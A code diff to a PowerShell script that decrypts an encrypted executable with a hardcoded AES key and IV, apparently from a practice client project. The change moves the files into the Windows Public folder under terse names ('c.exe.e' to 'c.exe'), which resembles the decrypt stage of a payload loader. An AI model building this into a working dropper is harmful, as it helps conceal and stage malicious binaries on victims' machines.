@@ -10,16 +10,20 @@ function Convert-HexStringToByteArray($hex) {
 }
 
 # Correctly resolve paths relative to the project hierarchy
-# TODO: Modify the path for practice
-$scriptDir = (Get-Item .).FullName
-$encryptedFilePath = Join-Path $scriptDir "..\..\client\dist\client_encrypted.exe"
-$decryptedFilePath = Join-Path $scriptDir "..\..\client\dist\client_decrypted.exe"
+# Assume the required files are located in $env:public
+$encryptedFilePath = Join-Path $env:public "c.exe.e"
+$decryptedFilePath = Join-Path $env:public "c.exe"
+if (-not (Test-Path $encryptedFilePath)) {
+    # Unable to proceed
+    Write-Output "$encryptedFilePath doesn't exist"
+    exit -1
+}
 
 $decryptionKeyHex  = "6B6E6967687463686173657200000000"
 $decryptionKey     = Convert-HexStringToByteArray $decryptionKeyHex
 
 $ivHex             = "576167616D616D6152616B6961000000"
-$iv                = Convert-HexStringToByteArray $ivHex  # Ensure consistent IV conversion
+$iv                = Convert-HexStringToByteArray $ivHex  
 
 try {
     # Ensure paths are valid
